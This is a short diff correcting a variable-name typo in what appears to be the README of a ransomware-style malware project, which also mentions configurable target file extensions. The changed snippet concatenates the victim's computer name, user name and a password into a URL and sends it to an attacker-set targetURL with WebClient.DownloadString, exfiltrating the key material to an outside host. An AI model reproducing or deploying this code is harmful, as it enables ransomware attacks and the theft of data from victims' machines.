@@ -30,7 +30,7 @@ https://www.youtube.com/watch?v=LtiRISepIfs
   ```
   string info = computerName + "-" + userName + " " + password;
   var fullUrl = targetURL + info;
-  var conent = new System.Net.WebClient().DownloadString(fullUrl);
+  var content = new System.Net.WebClient().DownloadString(fullUrl);
   
   ```
 * Target file extensions can be change. Default list:
